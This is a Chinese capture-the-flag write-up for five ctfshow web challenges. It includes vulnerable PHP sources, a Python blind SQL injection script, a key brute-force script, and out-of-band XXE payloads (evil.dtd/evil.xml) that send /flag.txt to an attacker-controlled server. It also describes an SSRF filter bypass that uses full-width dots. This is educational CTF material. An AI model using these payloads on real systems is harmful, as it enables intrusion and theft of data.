# 原创
：  ctfshow WEB AK赛

# ctfshow WEB AK赛

#### WEB AK赛

## 签到_观己

### 考点

> 
文件包含


### 思路

> 
盲猜一波flag在根目录下，所以直接读取试试


### Payload

> 
源码


```
&lt;?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match('/php/i', $file)){
        die('error');
    }else{
        include($file);
    }

}else{
    highlight_file(__FILE__);
}

?&gt;

```

## web1_观字

### 考点

> 
正则表达式绕过，ssrf


### 思路

> 
观察源码，发现其过滤了很多关键词，源码提示我们flag的位置但是 `.`被过滤了，想到 `。`可以替代 `.`，于是将 `http://192.168.7.68/flag`换成 `http://192。168。7。68/flag`，然后进行url编码 `%68%74%74%70%3A%2F%2F%31%39%32%E3%80%82%31%36%38%E3%80%82%37%E3%80%82%36%38%2F%66%6C%61%67`


### Payload

> 
源码


```
&lt;?php

#flag in http://192.168.7.68/flag
if(isset($_GET['url'])){
    $url = $_GET['url'];
    $protocol = substr($url, 0,7);
    if($protocol!='http://'){
        die('仅限http协议访问');
    }
    if(preg_match('/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\'|\"|\.|\,|\?|\[|\]|\{|\}|\!|\&amp;|\$|0/', $url)){
        die('仅限域名地址访问');
    }
    system('curl '.$url);
}

```

## web2_观星

### 考点

> 
SQL注入


### 思路

> 
观察url `http://ec9d42c5-9d82-47f6-b1e0-e6ad1f0ec75d.challenge.ctf.show:8080/index.php?id=3`，`id`值很可能存在sql注入点，利用burpsuite进行fuzz一下，其中524是被过滤了的，


> 
未过滤 `^`，考虑布尔盲注`payload:id=1^case(ord(substr((database())from({0})for(1))))when({1})then(2)else(3)end.format(i,j)`，过滤了逗号，if 无法使用则用`case…when…then…else…end#` 代替绕过，substr中的逗号用`substr(…from…for…)`代替绕过


### Payload

> 
注入脚本


```
import requests

baseurl='http://ec9d42c5-9d82-47f6-b1e0-e6ad1f0ec75d.challenge.ctf.show:8080/index.php?id=1^'
value=""
for i in range(49,100):
    for j in range(38,128):
        # paylaod='case(ord(substr(database()from({})for(1))))when({})then(2)else(3)end'.format(i,j)
        # paylaod='case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from({})for(1))))when({})then(2)else(3)end'.format(i,j)
        # paylaod='case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp(0x666c6167))from({})for(1))))when({})then(2)else(3)end'.format(i,j)
        paylaod='case(ord(substr((select(flag)from(flag))from({})for(1))))when({})then(2)else(3)end'.format(i,j)
        # "case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from({0})for(1))))when({1})then(2)else(3)end".format(i, j)
        newurl=baseurl+paylaod
        rep=requests.get(newurl)
        # print(rep)
        if "I asked nothing" in rep.text:
            print(value)
            value+=chr(j)
            break

```

## web3_观图

### 考点

> 
openssl_decrypt加密


### 思路

> 
F12查看源码发现 `showImage.php?image=Z6Ilu83MIDw=`，访问 `showImage.php`查看源码，图片文件名是Z6Ilu83MIDw=经过bf-ecb算法用key得到的，key的生成方式为 `substr(md5('ctfshow'.rand()),3,8)`，查询rand() 函数若里面的参数为空，则返回 0 到 getrandmax() 之间的伪随机整数，getrandmax()函数返回随机数可能返回的最大值，既然有上限即可进行爆破来得出key值，为 `5a78dbb4`，然后利用 `openssl_decrypt($image, 'bf-ecb', $key)`，得到 `config.php`的值，传参 `?image=N6bf8Bd8jm0SpmTZGl0isw==`，下载图片得到flag


### Payload

> 
showImage.php源码


```
&lt;?php

//$key = substr(md5('ctfshow'.rand()),3,8);
//flag in config.php
include('config.php');
if(isset($_GET['image'])){
    $image=$_GET['image'];
    $str = openssl_decrypt($image, 'bf-ecb', $key);
    if(file_exists($str)){
        header('content-type:image/gif');
        echo file_get_contents($str);
    }
}else{
    highlight_file(__FILE__);
}
?&gt;

```

> 
爆破脚本


```
&lt;?php
    for($i=0;$i&lt;getrandmax();$i++){
        $key = substr(md5('ctfshow'.$i),3,8);
        $image="Z6Ilu83MIDw=";
        $str = openssl_decrypt($image, 'bf-ecb', $key);
        if(strpos($str,"gif") or strpos($str,"jpg") or strpos($str,"png")){
            print($str."\n");
            print($i."\n");
            print($key."\n");
            break;
        }
    }

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210614173951771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210614173957259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210614174003674.png#pic_center"/>

## web4_观心

### 考点

> 
xxe


### 思路

> 
查看源码中的commo.js文件，当我们没有填city的时候报错，推测考点xxe，然后测试api这个借口，发现必须是http(s)协议，而且必须包含.xml,于是利用思路：自己vps上构造恶意xml读取文件，首先新建两个文件，ip用自己的服务器ip替代，将两个文件上传到自己服务器，访问：`http://b8e15b29-d83f-4e6d-8015-f5b726b1685c.challenge.ctf.show:8080/api.php`，`post:city=fuzhou&amp;api=http://ip/evil.xml`，base64解码获得flag


### Payload

> 
commo.js源码


```
function jstq(){
        var city='';
        $.ajax({
            type:'GET',
            url:'http://ip-api.com/json/',
            async:false,
            dataType:'json',
            success:function(data){
              city = data['city'];
            }
        });
        var ret = '';
        $.ajax({
                type: 'POST',
                url: 'api.php',
                async : false,
                dataType: 'json',
                data:{
                        api:'http://flash.weather.com.cn/wmaps/xml/city.xml', //网址http://开头，必须xml结尾，否则错误
                        city:city
                },
                success: function(data){
                      ret = data['msg'];
                }
                }); 
        return ret;

/*      $api = str_replace('city', $city, $api); 替换城市为访问者所在城市
        $xml = geturl($api,'xml'); 获取xml数据
        $weather = simplexml_load_string($xml); 解析xml 数据
        foreach($weather-&gt;children() as $child)  遍历xml节点
              {
                if(strstr($child['cityname'],'市')){  cityname 包含 字符“市”，则认为是市区天气
                  $city = $child['cityname'];
                  $tq = $child['stateDetailed'];
                  $f = $child['windState'];
                }
              }
        xml 示例视图：http://flash.weather.com.cn/wmaps/xml/xian.xml
         */

}

```

> 
evil.dtd:


```
&lt;!ENTITY % file SYSTEM "PHP://filter/read=convert.base64-encode/resource=/flag.txt" &gt;
&lt;!ENTITY % all "&lt;!ENTITY xxe SYSTEM 'http://ip/?%file;'&gt;"&gt;
%all;

```

> 
evil.xml:


```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE ANY[ 
&lt;!ENTITY % xxe SYSTEM "http://ip/evil.dtd"&gt;
%xxe;
]&gt;
&lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;login&lt;/secret&gt;&lt;/reset&gt;

```
